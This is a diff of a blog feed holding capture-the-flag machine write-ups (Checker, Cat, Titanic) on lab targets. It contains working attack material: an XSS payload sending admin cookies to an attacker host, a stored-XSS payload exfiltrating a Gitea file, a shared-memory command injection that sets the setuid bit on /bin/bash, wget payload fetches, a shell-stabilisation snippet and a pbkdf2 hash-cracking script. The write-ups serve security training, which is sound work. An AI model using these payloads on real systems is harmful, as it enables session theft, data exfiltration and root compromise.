+	<span class="k">if</span> <span class="p">(</span><span class="n">share_memory</span> <span class="o">==</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">){</span>
+		<span class="n">perror</span><span class="p">(</span><span class="s">"shmat failed"</span><span class="p">);</span>
+		<span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+	<span class="p">}</span>
+	
+	<span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">message</span> <span class="o">=</span> <span class="s">"Leaked hash detected &gt; '; chmod +s /bin/bash;#"</span><span class="p">;</span>
+	<span class="c1">//Inject memory</span>
+	<span class="n">snprintf</span><span class="p">(</span><span class="n">share_memory</span><span class="p">,</span><span class="mh">0x400</span><span class="p">,</span><span class="s">"%s"</span><span class="p">,</span> <span class="n">message</span><span class="p">);</span>
+	
+	<span class="n">printf</span><span class="p">(</span><span class="s">"Message in shared memory: %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">share_memory</span><span class="p">);</span>
+	
+	<span class="c1">//detach shared memory</span>
+	<span class="k">if</span> <span class="p">(</span><span class="n">shmdt</span><span class="p">(</span><span class="n">share_memory</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">){</span>
+		<span class="n">perror</span><span class="p">(</span><span class="s">"shmdt failed"</span><span class="p">);</span>
+		<span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+	<span class="p">}</span>
+	
+	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+
 </code></pre></div></div>
 
-<p>${IFS%??} For blank spaces and convert it to url format</p>
+<p>Compile the script and create a loop to be injecting the generated memory address</p>
 
-<ul>
-  <li>We use nc to receive the connection and make the shell stable like this</li>
-</ul>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">gcc</span> <span class="o">-</span><span class="n">o</span> <span class="n">output</span> <span class="n">script</span><span class="p">.</span><span class="n">c</span>
 
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 <span class="nt">-c</span> <span class="s1">'import pty;pty.spawn("/bin/bash")'</span>
-<span class="nb">export </span><span class="nv">TERM</span><span class="o">=</span>xterm
-ctrl + z
-<span class="nb">stty </span>raw <span class="nt">-echo</span><span class="p">;</span> <span class="nb">fg</span>
 </code></pre></div></div>
 
-<p>We use cat etc/passwd for user</p>
+<p><img src="/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_46.png" alt="image.png" /></p>
 
-<ul>
-  <li>We’ve got and .jar with db credentials, using python</li>
-</ul>
+<p>Run the sudo command and verify that the setuid was applied correctly</p>
 
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 <span class="nt">-m</span> http.server 7777
+<p><img src="/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_47.png" alt="image.png" /></p>
+
+<p>Machine pwned!!!!</p>]]></content><author><name>GitHub User</name></author><category term="writeups" /><summary type="html"><![CDATA[Checker]]></summary></entry><entry><title type="html">Cat 1abb9525529180ae82d4f25f2121346a</title><link href="https://your-site-url/writeups/2025/07/17/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb.html" rel="alternate" type="text/html" title="Cat 1abb9525529180ae82d4f25f2121346a" /><published>2025-07-17T16:05:57+00:00</published><updated>2025-07-17T16:05:57+00:00</updated><id>https://your-site-url/writeups/2025/07/17/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb</id><content type="html" xml:base="https://your-site-url/writeups/2025/07/17/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb.html"><![CDATA[<h1 id="cat">Cat</h1>
+
+<h1 id="1-enumeration">1. Enumeration</h1>
+
+<p>Start enumerating ports, only two are opened</p>
+
+<p><img src="/assets/images/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb_image.png" alt="image.png" /></p>
+
+<p>Check web application running on it</p>
+
+<p><img src="/assets/images/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb_image_1.png" alt="image.png" /></p>
+
+<p>We could self-register a new account</p>
+
+<p><img src="/assets/images/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb_image_2.png" alt="image.png" /></p>
+
+<p>And we are able to upload a cat info</p>
+
+<p><img src="/assets/images/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb_image_3.png" alt="image.png" /></p>
+
+<p>To have a deeper knowledge about this site, we could perform a fuzzing searching for directories or php files</p>
+
+<p><img src="/assets/images/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb_image_4.png" alt="image.png" /></p>
+
+<p>Nothing interesting in the previous dictionary try with another one</p>
+
+<p><img src="/assets/images/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb_image_5.png" alt="image.png" /></p>
+
+<p>Effectively there is a repository behind it</p>
+
+<p><img src="/assets/images/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb_image_6.png" alt="image.png" /></p>
+
+<p>Use git dumper for extract files in this project</p>
+
+<p><img src="/assets/images/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb_image_7.png" alt="image.png" /></p>
+
+<p>Now we can check the backend to find vulnerabilities</p>
+
+<p><img src="/assets/images/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb_image_8.png" alt="image.png" /></p>
+
+<p>In admin.php an admin username is disclosed</p>
+
+<p><img src="/assets/images/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb_image_9.png" alt="image.png" /></p>
+
+<p>By the way, username field is not sanitized in here</p>
+
+<p><img src="/assets/images/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb_image_10.png" alt="image.png" /></p>
+
+<p>The cat name parameter is used in a sql query as it is send by the user</p>
+
+<p><img src="/assets/images/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb_image_11.png" alt="image.png" /></p>
+
+<p>Here we can build two potential vector attacks, a XSS in the username that could steal the cookie of the admin when the registered users are requested, and a SQL injection in the accept cat endpoint, which is available only as admin</p>
+
+<h1 id="2-user-flag">2. User flag</h1>
+
+<p>So, first set a xss payload to obtain admin flag, by now just put payload in the username field</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;script <span class="nv">src</span><span class="o">=</span>x <span class="nv">onerror</span><span class="o">=</span>this.src<span class="o">=</span><span class="s2">"http://ip:port/?c="</span>+encodeURIComponent<span class="o">(</span>document.cookie<span class="o">)&gt;</span>&lt;/script&gt;
 </code></pre></div></div>
 
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wget http://10.10.00.000:7777/&lt;file_name&gt;
+<p><img src="/assets/images/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb_image_12.png" alt="image.png" /></p>
+
+<p>Now register a new cat with that account, that’s how the admin could load the payload name</p>
+
+<p><img src="/assets/images/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb_image_13.png" alt="image.png" /></p>
+
+<p>Get admin cookie</p>
+
+<p><img src="/assets/images/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb_image_14.png" alt="image.png" /></p>
+
+<p>A new endpoint is available here</p>
+
+<p><img src="/assets/images/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb_image_15.png" alt="image.png" /></p>
+
+<p>As we saw before accept_cat endpoint has sql injection, we can use sqlmap here, note that the admin cookie is needed here</p>
+
+<p><img src="/assets/images/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb_image_16.png" alt="image.png" /></p>
+
+<p><img src="/assets/images/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb_image_17.png" alt="image.png" /></p>
+
+<p>rosa hash is crackeable</p>
+
+<p><img src="/assets/images/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb_image_18.png" alt="image.png" /></p>
+
+<p>Get access through ssh</p>
+
+<p><img src="/assets/images/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb_image_19.png" alt="image.png" /></p>
+
+<p>Looking around we have access to logs, sometimes those files do not encrypt data</p>
+
+<p><img src="/assets/images/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb_image_20.png" alt="image.png" /></p>
+
+<p>Effectively we have axel password disclosed</p>
+
+<p><img src="/assets/images/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb_image_21.png" alt="image.png" /></p>
+
+<p>User flag was there!!</p>
+
+<p><img src="/assets/images/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb_image_22.png" alt="image.png" /></p>
+
+<h1 id="3priv-esc">3.Priv esc</h1>
+
+<p>The last step give us a clue about a possible privilege escalation attack, we have a mail where it is being persistent in a new management system on port 3000</p>
+
+<p><img src="/assets/images/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb_image_23.png" alt="image.png" /></p>
+
+<p>That port is open here</p>
+
+<p><img src="/assets/images/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb_image_24.png" alt="image.png" /></p>
+
+<p>Forward those ports to see what is going on</p>
+
+<p><img src="/assets/images/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb_image_25.png" alt="image.png" /></p>
+
+<p>Gitea is being used to this purpose</p>
+
+<p><img src="/assets/images/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb_image_26.png" alt="image.png" /></p>
+
+<p>As a first steps check versions, this seems to be an oldie one because right now they are on 1.23 version</p>
+
+<p><img src="/assets/images/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb_image_27.png" alt="image.png" /></p>
+
+<p>This vulnerability consist in a stored xss where someone could leverage description field in a repo to plant a javascript payload trying to retrieve the content of /administrator/Employee-management/raw/branch/main/index.php which has important information about the administrator which according to the mail seems to be jorbert</p>
+
+<p><img src="/assets/images/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb_image_28.png" alt="image.png" /></p>
+
+<p>Prepare the payload</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">"javascript.fetch('http://localhost:3000/administrator/Employee-management/raw/branch/main/index.php').then(response =&gt; response.text()).then(data =&gt; fetch('http://ip:port/?content='+encodeURIComponent(data)))"</span><span class="o">&gt;</span>hahaha&lt;/a&gt;
 </code></pre></div></div>
 
-<ul>
-  <li>Look for creds:</li>
-</ul>
+<p><img src="/assets/images/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb_image_29.png" alt="image.png" /></p>
 
-<p><img src="/assets/images/cozyhosting/Untitled%207.png" alt="Untitled" /></p>
+<p>This is our malicious repo</p>
 
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>psql <span class="nt">-h</span> 127.0.0.1 <span class="nt">-U</span> postgres
+<p><img src="/assets/images/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb_image_30.png" alt="image.png" /></p>
+
+<p>Now send an email to jobert as it is said in the mail</p>
+
+<p><img src="/assets/images/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb_image_31.png" alt="image.png" /></p>
+
+<p><img src="/assets/images/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb_image_32.png" alt="image.png" /></p>
+
+<p>wait a little bit to obtain root password</p>
+
+<p><img src="/assets/images/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb_image_33.png" alt="image.png" /></p>
+
+<p><img src="/assets/images/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb_image_34.png" alt="image.png" /></p>
+
+<p>Machine pwned!!!</p>]]></content><author><name>GitHub User</name></author><category term="writeups" /><summary type="html"><![CDATA[Cat]]></summary></entry><entry><title type="html">Titanic 1eab9525529180a9b52fc9a7eb126a50</title><link href="https://your-site-url/writeups/2025/07/17/79cfbba1-5d00-4be3-9024-410aeb127310-export-17230101-c486-4db1-a5be-7f8c4dbff5b9.html" rel="alternate" type="text/html" title="Titanic 1eab9525529180a9b52fc9a7eb126a50" /><published>2025-07-17T16:05:57+00:00</published><updated>2025-07-17T16:05:57+00:00</updated><id>https://your-site-url/writeups/2025/07/17/79cfbba1-5d00-4be3-9024-410aeb127310-export-17230101-c486-4db1-a5be-7f8c4dbff5b9</id><content type="html" xml:base="https://your-site-url/writeups/2025/07/17/79cfbba1-5d00-4be3-9024-410aeb127310-export-17230101-c486-4db1-a5be-7f8c4dbff5b9.html"><![CDATA[<h1 id="titanic">Titanic</h1>
+
+<h1 id="1-enumeration">1. Enumeration</h1>
+
+<p>Start enumerating ports</p>
+
+<p><img src="/assets/images/79cfbba1-5d00-4be3-9024-410aeb127310-export-17230101-c486-4db1-a5be-7f8c4dbff5b9/79cfbba1-5d00-4be3-9024-410aeb127310-export-17230101-c486-4db1-a5be-7f8c4dbff5b9_image.png" alt="image.png" /></p>
+
+<p>A web application running on port 80, it is possible to book a trip</p>
+
+<p><img src="/assets/images/79cfbba1-5d00-4be3-9024-410aeb127310-export-17230101-c486-4db1-a5be-7f8c4dbff5b9/79cfbba1-5d00-4be3-9024-410aeb127310-export-17230101-c486-4db1-a5be-7f8c4dbff5b9_image_1.png" alt="image.png" /></p>
+
+<p>Then we can download the resume of the booking</p>
+
+<p><img src="/assets/images/79cfbba1-5d00-4be3-9024-410aeb127310-export-17230101-c486-4db1-a5be-7f8c4dbff5b9/79cfbba1-5d00-4be3-9024-410aeb127310-export-17230101-c486-4db1-a5be-7f8c4dbff5b9_image_2.png" alt="image.png" /></p>
+
+<p><img src="/assets/images/79cfbba1-5d00-4be3-9024-410aeb127310-export-17230101-c486-4db1-a5be-7f8c4dbff5b9/79cfbba1-5d00-4be3-9024-410aeb127310-export-17230101-c486-4db1-a5be-7f8c4dbff5b9_image_3.png" alt="image.png" /></p>
+
+<h1 id="2-user-flag">2. User flag</h1>
+
+<p>There is no input sanitization at all, we can access another files performing path traversal attack</p>
+
+<p><img src="/assets/images/79cfbba1-5d00-4be3-9024-410aeb127310-export-17230101-c486-4db1-a5be-7f8c4dbff5b9/79cfbba1-5d00-4be3-9024-410aeb127310-export-17230101-c486-4db1-a5be-7f8c4dbff5b9_image_4.png" alt="image.png" /></p>
+
+<p>Easy to enumerate users, with a shell available</p>
+
+<p><img src="/assets/images/79cfbba1-5d00-4be3-9024-410aeb127310-export-17230101-c486-4db1-a5be-7f8c4dbff5b9/79cfbba1-5d00-4be3-9024-410aeb127310-export-17230101-c486-4db1-a5be-7f8c4dbff5b9_image_5.png" alt="image.png" /></p>
+
+<p>A really easy way to access the user flag using this information</p>
+
+<p><img src="/assets/images/79cfbba1-5d00-4be3-9024-410aeb127310-export-17230101-c486-4db1-a5be-7f8c4dbff5b9/79cfbba1-5d00-4be3-9024-410aeb127310-export-17230101-c486-4db1-a5be-7f8c4dbff5b9_image_6.png" alt="image.png" /></p>
+
+<p>This seems to be a unintended, anyways we need to do more steps further to gain a shell as this user, enumerate subdomains using FFUF</p>
+
+<p><img src="/assets/images/79cfbba1-5d00-4be3-9024-410aeb127310-export-17230101-c486-4db1-a5be-7f8c4dbff5b9/79cfbba1-5d00-4be3-9024-410aeb127310-export-17230101-c486-4db1-a5be-7f8c4dbff5b9_image_7.png" alt="image.png" /></p>
+
+<p>A version controlling is present in this subdomain</p>
+
+<p><img src="/assets/images/79cfbba1-5d00-4be3-9024-410aeb127310-export-17230101-c486-4db1-a5be-7f8c4dbff5b9/79cfbba1-5d00-4be3-9024-410aeb127310-export-17230101-c486-4db1-a5be-7f8c4dbff5b9_image_8.png" alt="image.png" /></p>
+
+<p>Check the compose file to find worthy paths</p>
+
+<p><img src="/assets/images/79cfbba1-5d00-4be3-9024-410aeb127310-export-17230101-c486-4db1-a5be-7f8c4dbff5b9/79cfbba1-5d00-4be3-9024-410aeb127310-export-17230101-c486-4db1-a5be-7f8c4dbff5b9_image_9.png" alt="image.png" /></p>
+
+<p>This is just a clue, the root gitea directory is disclosed, now we need to find a config file or a database, those are possible paths</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">gitea</span><span class="o">/</span><span class="n">data</span><span class="o">/</span><span class="n">gitea</span><span class="p">.</span><span class="n">db</span>
+<span class="o">/</span><span class="n">data</span><span class="o">/</span><span class="n">gitea</span><span class="o">/</span><span class="n">conf</span><span class="o">/</span><span class="n">app</span><span class="p">.</span><span class="n">ini</span>
+<span class="o">~/</span><span class="p">.</span><span class="n">gitea</span><span class="o">/</span><span class="n">custom</span><span class="o">/</span><span class="n">conf</span><span class="o">/</span><span class="n">app</span><span class="p">.</span><span class="n">ini</span>
 </code></pre></div></div>
 
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="se">\c</span> cozyhosting
+<p>finally it is on <code class="language-plaintext highlighter-rouge">/home/developer/gitea/data/gitea/gitea.db</code></p>
+
+<p><img src="/assets/images/79cfbba1-5d00-4be3-9024-410aeb127310-export-17230101-c486-4db1-a5be-7f8c4dbff5b9/79cfbba1-5d00-4be3-9024-410aeb127310-export-17230101-c486-4db1-a5be-7f8c4dbff5b9_image_10.png" alt="image.png" /></p>
+
+<p>There is a hash with this password hash algorithm (pbkdf2)</p>
+
+<p><img src="/assets/images/79cfbba1-5d00-4be3-9024-410aeb127310-export-17230101-c486-4db1-a5be-7f8c4dbff5b9/79cfbba1-5d00-4be3-9024-410aeb127310-export-17230101-c486-4db1-a5be-7f8c4dbff5b9_image_11.png" alt="image.png" /></p>
+
+<p>Search a little bit to be able to crack it using hashcat</p>
+
+<p><img src="/assets/images/79cfbba1-5d00-4be3-9024-410aeb127310-export-17230101-c486-4db1-a5be-7f8c4dbff5b9/79cfbba1-5d00-4be3-9024-410aeb127310-export-17230101-c486-4db1-a5be-7f8c4dbff5b9_image_12.png" alt="image.png" /></p>
+
+<p>Follow the previous instructions but don’t forget it is in hexadecimal format, we need to pass it from hex to its original bytes format, then we can encode it to base64</p>
+
+<p><img src="/assets/images/79cfbba1-5d00-4be3-9024-410aeb127310-export-17230101-c486-4db1-a5be-7f8c4dbff5b9/79cfbba1-5d00-4be3-9024-410aeb127310-export-17230101-c486-4db1-a5be-7f8c4dbff5b9_image_13.png" alt="image.png" /></p>
+
+<p><img src="/assets/images/79cfbba1-5d00-4be3-9024-410aeb127310-export-17230101-c486-4db1-a5be-7f8c4dbff5b9/79cfbba1-5d00-4be3-9024-410aeb127310-export-17230101-c486-4db1-a5be-7f8c4dbff5b9_image_14.png" alt="image.png" /></p>
+
+<p>Another way is using a python script, automating this process and avoiding using hashcat</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">hashlib</span>
+<span class="kn">import</span> <span class="nn">binascii</span>
+
+<span class="k">def</span> <span class="nf">create_pbkdf2hash</span><span class="p">(</span><span class="n">password</span><span class="p">,</span> <span class="n">salt</span><span class="p">,</span> <span class="n">iterations</span><span class="p">,</span> <span class="n">dklen</span><span class="p">):</span>
+	<span class="n">hash_gen</span> <span class="o">=</span> <span class="n">hashlib</span><span class="p">.</span><span class="n">pbkdf2_hmac</span><span class="p">(</span><span class="s">'sha256'</span><span class="p">,</span><span class="n">password</span><span class="p">.</span><span class="n">encode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">),</span> <span class="n">salt</span><span class="p">,</span> <span class="n">iterations</span><span class="p">,</span> <span class="n">dklen</span><span class="p">)</span>
+	<span class="k">return</span> <span class="n">hash_gen</span>
+
+<span class="k">def</span> <span class="nf">crack_hash</span><span class="p">(</span><span class="n">dictionary_file</span><span class="p">,</span> <span class="n">target_hash</span><span class="p">,</span> <span class="n">salt</span><span class="p">,</span> <span class="n">iterations</span><span class="o">=</span><span class="mi">50000</span><span class="p">,</span> <span class="n">dklen</span><span class="o">=</span><span class="mi">50</span><span class="p">):</span>
+	<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">dictionary_file</span><span class="p">,</span> <span class="s">'r'</span><span class="p">,</span> <span class="n">encoding</span><span class="o">=</span><span class="s">'utf-8'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+		<span class="n">count</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+		<span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">f</span><span class="p">:</span>
+			<span class="n">password</span> <span class="o">=</span> <span class="n">line</span><span class="p">.</span><span class="n">strip</span><span class="p">()</span>
+			<span class="n">hash_value</span> <span class="o">=</span> <span class="n">create_pbkdf2hash</span><span class="p">(</span><span class="n">password</span><span class="p">,</span> <span class="n">salt</span><span class="p">,</span> <span class="n">iterations</span><span class="p">,</span> <span class="n">dklen</span><span class="p">)</span>
+			<span class="n">count</span> <span class="o">+=</span> <span class="mi">1</span>
+			<span class="k">if</span> <span class="n">hash_value</span> <span class="o">==</span> <span class="n">target_hash</span><span class="p">:</span>
+				<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">'password found: </span><span class="si">{</span><span class="n">line</span><span class="si">}</span><span class="s">, count </span><span class="si">{</span><span class="n">count</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>
+		<span class="k">print</span><span class="p">(</span><span class="s">'Password not found'</span><span class="p">)</span>
+		
+
+<span class="n">salt</span> <span class="o">=</span> <span class="n">binascii</span><span class="p">.</span><span class="n">unhexlify</span><span class="p">(</span><span class="s">'salt'</span><span class="p">)</span>
+<span class="n">target_hash</span> <span class="o">=</span> <span class="n">binascii</span><span class="p">.</span><span class="n">unhexlify</span><span class="p">(</span><span class="s">'hash'</span><span class="p">)</span>
+<span class="n">dictionary_file</span> <span class="o">=</span> <span class="s">'/usr/share/wordlist/rockyou.txt'</span>
+<span class="n">crack_hash</span><span class="p">(</span><span class="n">dictionary_file</span><span class="p">,</span> <span class="n">target_hash</span><span class="p">,</span> <span class="n">salt</span><span class="p">)</span>
 </code></pre></div></div>
 
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="se">\d</span>
-<span class="k">select</span> <span class="k">*</span> from <span class="nb">users</span><span class="p">;</span>
+<p>Then password is found and we can access as developer through ssh</p>
+
+<p><img src="/assets/images/79cfbba1-5d00-4be3-9024-410aeb127310-export-17230101-c486-4db1-a5be-7f8c4dbff5b9/79cfbba1-5d00-4be3-9024-410aeb127310-export-17230101-c486-4db1-a5be-7f8c4dbff5b9_image_15.png" alt="image.png" /></p>
+
+<h1 id="3priv-esc">3.Priv esc</h1>
+
+<p>In opt there are some automation scripts, this takes every .jpg in a directory and it is passed to <code class="language-plaintext highlighter-rouge">magick</code> tool to identify every image</p>
+
+<p><img src="/assets/images/79cfbba1-5d00-4be3-9024-410aeb127310-export-17230101-c486-4db1-a5be-7f8c4dbff5b9/79cfbba1-5d00-4be3-9024-410aeb127310-export-17230101-c486-4db1-a5be-7f8c4dbff5b9_image_16.png" alt="image.png" /></p>
+
+<p>Checking it version we can see it is vulnerable to CVE-2024-41817, basically it is compiled by gcc, imagemagick is leaving some environment variables (LD_LIBRARY_PATH, MAGICK_COINFIGURE_PAHT) with insecure paths, if those paths do not exist, the tool will fallback using shared libraries present in the current directory</p>
+
